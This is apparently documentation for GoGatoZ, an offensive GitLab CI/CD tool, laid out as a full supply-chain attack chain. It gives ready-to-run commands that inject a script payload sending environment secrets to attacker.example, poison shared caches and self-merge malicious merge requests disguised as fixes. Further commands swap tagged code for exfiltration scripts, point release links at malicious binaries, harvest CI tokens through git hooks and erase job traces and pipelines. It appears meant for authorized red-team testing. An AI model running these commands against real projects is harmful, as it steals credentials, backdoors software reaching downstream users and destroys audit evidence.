---
title: Supply Chain Attacks
description: Full supply chain attack workflows using GoGatoZ — from reconnaissance to release tampering
---

This guide walks through the full CI/CD supply chain attack kill chain using GoGatoZ. Each step builds on the previous one, progressing from reconnaissance through exploitation to anti-forensics.

> Warning: These techniques are for authorized security testing only. Obtain written permission before testing.

## 1. Reconnaissance

Use `enumerate` to discover projects vulnerable to supply chain attacks. The key findings to look for are `SCRIPT_INJECTION_RISK`, `SELF_MERGE_POSSIBLE`, and `CACHE_POISONING_RISK`.

```bash
# Scan a group for supply chain attack surfaces
gogatoz enumerate --group 42 --output jsonl --only-findings | \
  grep -E 'SCRIPT_INJECTION_RISK|SELF_MERGE_POSSIBLE|CACHE_POISONING_RISK'
```

Projects with `SELF_MERGE_POSSIBLE` combined with `SCRIPT_INJECTION_RISK` are high-value targets — an attacker can modify a called script and merge it without additional approval.

## 2. Script Injection

When a CI job calls an external script (e.g., `./scripts/deploy.sh`), modifying that script is less visible than changing `.gitlab-ci.yml` directly. Use `--inject-script` to inject a payload into a repo script that CI already executes.

![Auto-merged supply chain MR — self-approved and merged without review](/images/ctf/08-auto-merge-mr-merged.png)

```bash
gogatoz attack --inject-script --target group/proj \
  --script-payload 'curl -sS -d "$(printenv|base64 -w0)" http://attacker.example/cb' \
  --branch gogatoz-attack --deconflict suffix
```

Key options:
- `--script-path` to target a specific script (auto-detected from CI config if omitted)
- `--script-prepend` (default: true) places payload before existing script content
- `--trigger-pipeline` to immediately trigger execution after injection

## 3. Cache Poisoning

Shared CI caches without branch isolation allow cross-branch poisoning. A job on an attacker-controlled branch writes malicious content to a cache key consumed by jobs on the default branch.

```bash
gogatoz attack --commit-ci --target group/proj \
  --payload cache-poison --cache-key shared-deps \
  --poison-cmd 'echo "malicious" > node_modules/package.json' \
  --tags shell --branch gogatoz-attack --deconflict suffix
```

The `cache-poison` payload generates a CI job that writes to the specified cache key. When the next default-branch pipeline restores that cache, the poisoned content is consumed.

## 4. Auto-Merge

When a project has weak approval rules (`SELF_MERGE_POSSIBLE`), GoGatoZ can create a merge request, self-approve, and merge it in one step. This pushes malicious changes directly to the default branch.

```bash
gogatoz attack --auto-merge --target group/proj \
  --ci-yaml 'stages:\n  - pwn\npwn:\n  stage: pwn\n  script: [printenv]\n  tags: [shell]' \
  --mr-title "Fix CI configuration"
```

The `--auto-merge` mode handles the full lifecycle: branch creation, commit, MR creation, approval, and merge. Use `--mr-title` and `--mr-description` to make the MR look legitimate.

## 5. Release and Package Tampering

After gaining write access, tamper with release artifacts to distribute backdoored binaries or packages to downstream consumers.

### Tag poisoning (Trivy-style)

Swap a file in a tagged commit to inject malicious code into pipelines that consume the tag ref. This mimics the [Trivy supply chain attack](https://www.stepsecurity.io/blog/trivy-compromised-a-second-time---malicious-v0-69-4-release):

```bash
gogatoz attack --tamper-tag --target group/proj \
  --tag-name v1.0.0 \
  --tamper-tag-payload '#!/bin/sh
printenv | base64'
```

![Poisoned entrypoint.sh on the v1.0.0 tag — original code replaced with exfiltration payload](/images/ctf/14-travy-poisoned-entrypoint.png)

### Release tampering

Replace or add asset links on an existing GitLab release:

```bash
gogatoz attack --tamper-release --target group/proj \
  --tag-name v1.2.0 \
  --add-link-name "Binary (linux-amd64)" \
  --add-link-url "https://attacker.example/malicious-binary"
```

### Package tampering

Upload a malicious package to the project's Generic Packages registry:

```bash
gogatoz attack --tamper-package --target group/proj \
  --package-name mylib --package-version 2.0.1 \
  --package-file ./backdoored-lib.tar.gz
```

Both techniques target downstream consumers who pull artifacts from the project without verifying checksums or signatures.

## 6. Token Harvesting

For persistent access, install git hooks on runners that capture tokens from subsequent CI jobs. The `--harvest` mode combines hook installation with a local callback server.

```bash
gogatoz attack --harvest --target group/proj \
  --webhook https://attacker.example/callback --tags shell \
  --harvest-timeout 30m
```

The hook captures environment variables (including `CI_JOB_TOKEN`, `CI_REGISTRY_PASSWORD`, and any custom secrets) from every job that runs on the compromised runner, then POSTs them to the callback URL.

Key options:
- `--hook-type` selects the git hook (post-checkout, post-merge, pre-push)
- `--harvest-listen` sets the local listener address (default: :9443)
- `--harvest-timeout` controls how long to wait for callbacks

## 7. Anti-Forensics

After completing an engagement, clean up traces to demonstrate the difficulty of detecting these attacks (and to leave the environment clean).

### Delete attack branches

```bash
gogatoz attack --target group/proj --cleanup \
  --cleanup-branch gogatoz-attack
```

### Erase job traces

```bash
gogatoz attack --target group/proj --cleanup --cleanup-jobs \
  --cleanup-jobs-ref gogatoz-attack --cleanup-jobs-max 5
```

### Delete specific pipelines

```bash
gogatoz attack --target group/proj --cleanup \
  --cleanup-pipeline 12345
```

### Full cleanup with pipeline deletion

```bash
gogatoz attack --target group/proj --cleanup --cleanup-jobs \
  --cleanup-jobs-ref gogatoz-attack --cleanup-jobs-max 3 \
  --cleanup-jobs-delete
```

The `--cleanup-jobs-delete` flag deletes pipelines after erasing their job traces, removing all evidence of execution.

## Putting It Together

A typical supply chain engagement follows this sequence:

1. **Enumerate** to find projects with `SELF_MERGE_POSSIBLE` or `SCRIPT_INJECTION_RISK`
2. **Inject** a payload via script injection or cache poisoning (lower detection risk than modifying CI config)
3. **Merge** malicious changes using `--auto-merge` if approval rules are weak
4. **Tamper** with releases or packages to affect downstream consumers
5. **Harvest** tokens for lateral movement to other projects or registries
6. **Clean up** branches, job traces, and pipelines

Document each step with timestamps and evidence for the final report. Use `--output jsonl` during enumeration to capture structured findings for the report.
